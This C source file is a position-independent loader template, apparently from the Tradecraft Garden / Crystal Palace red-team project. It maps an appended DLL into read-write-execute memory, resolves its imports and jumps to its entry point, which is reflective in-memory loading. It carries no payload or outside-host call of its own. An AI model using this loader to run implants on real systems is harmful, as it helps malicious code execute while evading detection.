/*
 * Minimal PIC loader — Simple Loader template
 * Tradecraft Garden / Crystal Palace  (BSD-3-Clause)
 *
 * Loads an appended DLL into memory and hands off execution.
 * Extend from here; see SKILL.md and references/ for details.
 */

#include <windows.h>
#include "tcg.h"

/* ── DFR declarations ─────────────────────────────────────────────────────── */

WINBASEAPI LPVOID WINAPI KERNEL32$VirtualAlloc(LPVOID, SIZE_T, DWORD, DWORD);
WINBASEAPI BOOL   WINAPI KERNEL32$VirtualFree(LPVOID, SIZE_T, DWORD);

/* ── Appended DLL anchor ──────────────────────────────────────────────────── */

char __DLLDATA__[0] __attribute__((section("dll_data")));

static char * findDLL(void) {
    return (char *)&__DLLDATA__;
}

/* ── x86 caller helper (required by fixptrs) ─────────────────────────────── */

#ifdef WIN_X86
void * __attribute__((noinline)) caller(void) {
    void *ret;
    __asm__ volatile ("mov (%%esp), %0" : "=r"(ret));
    return ret;
}
#endif

/* ── Entry point ──────────────────────────────────────────────────────────── */

void go(void) {
    char       *dll = findDLL();
    DLLDATA     dllInfo;
    IMPORTFUNCS funcs;
    char       *base;
    DWORD       sz;

    ParseDLL(dll, &dllInfo);
    sz   = SizeOfDLL(&dllInfo);
    base = (char *)KERNEL32$VirtualAlloc(NULL, sz,
               MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    funcs.LoadLibraryA  = (void *)LoadLibraryA;
    funcs.GetProcAddress = (void *)GetProcAddress;

    LoadDLL(&dllInfo, dll, base);
    ProcessImports(&funcs, &dllInfo, base);

    __transfer((void *)EntryPoint(&dllInfo, base), base);
}
